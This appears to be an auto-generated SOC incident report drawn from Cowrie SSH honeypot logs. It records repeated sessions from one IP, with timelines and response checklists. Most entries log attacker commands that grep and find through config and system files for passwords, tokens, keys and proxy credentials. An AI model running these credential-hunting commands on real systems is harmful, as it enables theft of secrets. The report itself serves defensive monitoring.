| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:31` | `cowrie.session.connect` |
| `2026-07-13 12:39:31` | `cowrie.client.version` |
| `2026-07-13 12:39:31` | `cowrie.client.kex` |
| `2026-07-13 12:39:32` | `cowrie.login.success` |
| `2026-07-13 12:39:33` | `cowrie.client.var` |
| `2026-07-13 12:39:33` | `cowrie.client.var` |
| `2026-07-13 12:39:33` | `cowrie.session.params` |
| `2026-07-13 12:39:33` | `cowrie.command.input` |
| `2026-07-13 12:39:33` | `cowrie.log.closed` |
| `2026-07-13 12:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94dece5b7db

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:34` | `cowrie.session.connect` |
| `2026-07-13 12:39:34` | `cowrie.client.version` |
| `2026-07-13 12:39:34` | `cowrie.client.kex` |
| `2026-07-13 12:39:35` | `cowrie.login.success` |
| `2026-07-13 12:39:36` | `cowrie.client.var` |
| `2026-07-13 12:39:36` | `cowrie.client.var` |
| `2026-07-13 12:39:37` | `cowrie.session.params` |
| `2026-07-13 12:39:37` | `cowrie.command.input` |
| `2026-07-13 12:39:37` | `cowrie.log.closed` |
| `2026-07-13 12:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75948ef6d5e8

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:37` | `cowrie.session.connect` |
| `2026-07-13 12:39:37` | `cowrie.client.version` |
| `2026-07-13 12:39:37` | `cowrie.client.kex` |
| `2026-07-13 12:39:39` | `cowrie.login.success` |
| `2026-07-13 12:39:39` | `cowrie.client.var` |
| `2026-07-13 12:39:39` | `cowrie.client.var` |
| `2026-07-13 12:39:40` | `cowrie.session.params` |
| `2026-07-13 12:39:40` | `cowrie.command.input` |
| `2026-07-13 12:39:40` | `cowrie.log.closed` |
| `2026-07-13 12:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44e2341d4e9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:40` | `cowrie.session.connect` |
| `2026-07-13 12:39:40` | `cowrie.client.version` |
| `2026-07-13 12:39:40` | `cowrie.client.kex` |
| `2026-07-13 12:39:42` | `cowrie.login.success` |
| `2026-07-13 12:39:42` | `cowrie.client.var` |
| `2026-07-13 12:39:42` | `cowrie.client.var` |
| `2026-07-13 12:39:43` | `cowrie.session.params` |
| `2026-07-13 12:39:43` | `cowrie.command.input` |
| `2026-07-13 12:39:43` | `cowrie.log.closed` |
| `2026-07-13 12:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3617297fad8d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:43` | `cowrie.session.connect` |
| `2026-07-13 12:39:43` | `cowrie.client.version` |
| `2026-07-13 12:39:44` | `cowrie.client.kex` |
| `2026-07-13 12:39:45` | `cowrie.login.success` |
| `2026-07-13 12:39:45` | `cowrie.client.var` |
| `2026-07-13 12:39:45` | `cowrie.client.var` |
| `2026-07-13 12:39:46` | `cowrie.session.params` |
| `2026-07-13 12:39:46` | `cowrie.command.input` |
| `2026-07-13 12:39:46` | `cowrie.log.closed` |
| `2026-07-13 12:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aca7be8a008

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'proxy_auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:47` | `cowrie.session.connect` |
| `2026-07-13 12:39:47` | `cowrie.client.version` |
| `2026-07-13 12:39:47` | `cowrie.client.kex` |
| `2026-07-13 12:39:48` | `cowrie.login.success` |
| `2026-07-13 12:39:49` | `cowrie.client.var` |
| `2026-07-13 12:39:49` | `cowrie.client.var` |
| `2026-07-13 12:39:49` | `cowrie.session.params` |
| `2026-07-13 12:39:49` | `cowrie.command.input` |
| `2026-07-13 12:39:49` | `cowrie.log.closed` |
| `2026-07-13 12:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bbe5a175506

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'Proxy-Authorization' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:50` | `cowrie.session.connect` |
| `2026-07-13 12:39:50` | `cowrie.client.version` |
| `2026-07-13 12:39:50` | `cowrie.client.kex` |
| `2026-07-13 12:39:51` | `cowrie.login.success` |
| `2026-07-13 12:39:52` | `cowrie.client.var` |
| `2026-07-13 12:39:52` | `cowrie.client.var` |
| `2026-07-13 12:39:52` | `cowrie.session.params` |
| `2026-07-13 12:39:52` | `cowrie.command.input` |
| `2026-07-13 12:39:52` | `cowrie.log.closed` |
| `2026-07-13 12:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ada8a2d53a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:53` | `cowrie.session.connect` |
| `2026-07-13 12:39:53` | `cowrie.client.version` |
| `2026-07-13 12:39:53` | `cowrie.client.kex` |
| `2026-07-13 12:39:54` | `cowrie.login.success` |
| `2026-07-13 12:39:55` | `cowrie.client.var` |
| `2026-07-13 12:39:55` | `cowrie.client.var` |
| `2026-07-13 12:39:56` | `cowrie.session.params` |
| `2026-07-13 12:39:56` | `cowrie.command.input` |
| `2026-07-13 12:39:56` | `cowrie.log.closed` |
| `2026-07-13 12:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50361fa14d1d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:39 |
| **Last Seen** | 2026-07-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:39:56` | `cowrie.session.connect` |
| `2026-07-13 12:39:56` | `cowrie.client.version` |
| `2026-07-13 12:39:57` | `cowrie.client.kex` |
| `2026-07-13 12:39:58` | `cowrie.login.success` |
| `2026-07-13 12:39:58` | `cowrie.client.var` |
| `2026-07-13 12:39:58` | `cowrie.client.var` |
| `2026-07-13 12:39:59` | `cowrie.session.params` |
| `2026-07-13 12:39:59` | `cowrie.command.input` |
| `2026-07-13 12:39:59` | `cowrie.log.closed` |
| `2026-07-13 12:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba692023c3d1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:00` | `cowrie.session.connect` |
| `2026-07-13 12:40:00` | `cowrie.client.version` |
| `2026-07-13 12:40:00` | `cowrie.client.kex` |
| `2026-07-13 12:40:01` | `cowrie.login.success` |
| `2026-07-13 12:40:01` | `cowrie.client.var` |
| `2026-07-13 12:40:01` | `cowrie.client.var` |
| `2026-07-13 12:40:02` | `cowrie.session.params` |
| `2026-07-13 12:40:02` | `cowrie.command.input` |
| `2026-07-13 12:40:02` | `cowrie.log.closed` |
| `2026-07-13 12:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7bf414c7751

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:03` | `cowrie.session.connect` |
| `2026-07-13 12:40:03` | `cowrie.client.version` |
| `2026-07-13 12:40:03` | `cowrie.client.kex` |
| `2026-07-13 12:40:04` | `cowrie.login.success` |
| `2026-07-13 12:40:05` | `cowrie.client.var` |
| `2026-07-13 12:40:05` | `cowrie.client.var` |
| `2026-07-13 12:40:05` | `cowrie.session.params` |
| `2026-07-13 12:40:05` | `cowrie.command.input` |
| `2026-07-13 12:40:05` | `cowrie.log.closed` |
| `2026-07-13 12:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880bfc0b194e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:06` | `cowrie.session.connect` |
| `2026-07-13 12:40:06` | `cowrie.client.version` |
| `2026-07-13 12:40:06` | `cowrie.client.kex` |
| `2026-07-13 12:40:08` | `cowrie.login.success` |
| `2026-07-13 12:40:08` | `cowrie.client.var` |
| `2026-07-13 12:40:08` | `cowrie.client.var` |
| `2026-07-13 12:40:09` | `cowrie.session.params` |
| `2026-07-13 12:40:09` | `cowrie.command.input` |
| `2026-07-13 12:40:09` | `cowrie.log.closed` |
| `2026-07-13 12:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff0b127d8531

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:09` | `cowrie.session.connect` |
| `2026-07-13 12:40:09` | `cowrie.client.version` |
| `2026-07-13 12:40:09` | `cowrie.client.kex` |
| `2026-07-13 12:40:11` | `cowrie.login.success` |
| `2026-07-13 12:40:11` | `cowrie.client.var` |
| `2026-07-13 12:40:11` | `cowrie.client.var` |
| `2026-07-13 12:40:12` | `cowrie.session.params` |
| `2026-07-13 12:40:12` | `cowrie.command.input` |
| `2026-07-13 12:40:12` | `cowrie.log.closed` |
| `2026-07-13 12:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2bb57d5dd64

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'Proxy-Authorization|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:13` | `cowrie.session.connect` |
| `2026-07-13 12:40:13` | `cowrie.client.version` |
| `2026-07-13 12:40:13` | `cowrie.client.kex` |
| `2026-07-13 12:40:14` | `cowrie.login.success` |
| `2026-07-13 12:40:15` | `cowrie.client.var` |
| `2026-07-13 12:40:15` | `cowrie.client.var` |
| `2026-07-13 12:40:15` | `cowrie.session.params` |
| `2026-07-13 12:40:15` | `cowrie.command.input` |
| `2026-07-13 12:40:15` | `cowrie.log.closed` |
| `2026-07-13 12:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f7eda31e57

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'basic.*auth' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:16` | `cowrie.session.connect` |
| `2026-07-13 12:40:16` | `cowrie.client.version` |
| `2026-07-13 12:40:16` | `cowrie.client.kex` |
| `2026-07-13 12:40:17` | `cowrie.login.success` |
| `2026-07-13 12:40:18` | `cowrie.client.var` |
| `2026-07-13 12:40:18` | `cowrie.client.var` |
| `2026-07-13 12:40:18` | `cowrie.session.params` |
| `2026-07-13 12:40:18` | `cowrie.command.input` |
| `2026-07-13 12:40:18` | `cowrie.log.closed` |
| `2026-07-13 12:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6394c5147a9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:19` | `cowrie.session.connect` |
| `2026-07-13 12:40:19` | `cowrie.client.version` |
| `2026-07-13 12:40:19` | `cowrie.client.kex` |
| `2026-07-13 12:40:20` | `cowrie.login.success` |
| `2026-07-13 12:40:21` | `cowrie.client.var` |
| `2026-07-13 12:40:21` | `cowrie.client.var` |
| `2026-07-13 12:40:21` | `cowrie.session.params` |
| `2026-07-13 12:40:21` | `cowrie.command.input` |
| `2026-07-13 12:40:21` | `cowrie.log.closed` |
| `2026-07-13 12:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3e18537f42

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:22` | `cowrie.session.connect` |
| `2026-07-13 12:40:22` | `cowrie.client.version` |
| `2026-07-13 12:40:22` | `cowrie.client.kex` |
| `2026-07-13 12:40:23` | `cowrie.login.success` |
| `2026-07-13 12:40:24` | `cowrie.client.var` |
| `2026-07-13 12:40:24` | `cowrie.client.var` |
| `2026-07-13 12:40:25` | `cowrie.session.params` |
| `2026-07-13 12:40:25` | `cowrie.command.input` |
| `2026-07-13 12:40:25` | `cowrie.log.closed` |
| `2026-07-13 12:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0434d6f27b4

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:25` | `cowrie.session.connect` |
| `2026-07-13 12:40:25` | `cowrie.client.version` |
| `2026-07-13 12:40:25` | `cowrie.client.kex` |
| `2026-07-13 12:40:27` | `cowrie.login.success` |
| `2026-07-13 12:40:27` | `cowrie.client.var` |
| `2026-07-13 12:40:27` | `cowrie.client.var` |
| `2026-07-13 12:40:28` | `cowrie.session.params` |
| `2026-07-13 12:40:28` | `cowrie.command.input` |
| `2026-07-13 12:40:28` | `cowrie.log.closed` |
| `2026-07-13 12:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ece2c58ed53

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:28` | `cowrie.session.connect` |
| `2026-07-13 12:40:28` | `cowrie.client.version` |
| `2026-07-13 12:40:29` | `cowrie.client.kex` |
| `2026-07-13 12:40:30` | `cowrie.login.success` |
| `2026-07-13 12:40:30` | `cowrie.client.var` |
| `2026-07-13 12:40:30` | `cowrie.client.var` |
| `2026-07-13 12:40:31` | `cowrie.session.params` |
| `2026-07-13 12:40:31` | `cowrie.command.input` |
| `2026-07-13 12:40:31` | `cowrie.log.closed` |
| `2026-07-13 12:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ae7c98ca29

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:32` | `cowrie.session.connect` |
| `2026-07-13 12:40:32` | `cowrie.client.version` |
| `2026-07-13 12:40:32` | `cowrie.client.kex` |
| `2026-07-13 12:40:33` | `cowrie.login.success` |
| `2026-07-13 12:40:34` | `cowrie.client.var` |
| `2026-07-13 12:40:34` | `cowrie.client.var` |
| `2026-07-13 12:40:34` | `cowrie.session.params` |
| `2026-07-13 12:40:34` | `cowrie.command.input` |
| `2026-07-13 12:40:34` | `cowrie.log.closed` |
| `2026-07-13 12:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2cb242216f2

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:35` | `cowrie.session.connect` |
| `2026-07-13 12:40:35` | `cowrie.client.version` |
| `2026-07-13 12:40:35` | `cowrie.client.kex` |
| `2026-07-13 12:40:37` | `cowrie.login.success` |
| `2026-07-13 12:40:37` | `cowrie.client.var` |
| `2026-07-13 12:40:37` | `cowrie.client.var` |
| `2026-07-13 12:40:38` | `cowrie.session.params` |
| `2026-07-13 12:40:38` | `cowrie.command.input` |
| `2026-07-13 12:40:38` | `cowrie.log.closed` |
| `2026-07-13 12:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a649c9896a52

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'basic.*auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:38` | `cowrie.session.connect` |
| `2026-07-13 12:40:38` | `cowrie.client.version` |
| `2026-07-13 12:40:39` | `cowrie.client.kex` |
| `2026-07-13 12:40:40` | `cowrie.login.success` |
| `2026-07-13 12:40:41` | `cowrie.client.var` |
| `2026-07-13 12:40:41` | `cowrie.client.var` |
| `2026-07-13 12:40:41` | `cowrie.session.params` |
| `2026-07-13 12:40:41` | `cowrie.command.input` |
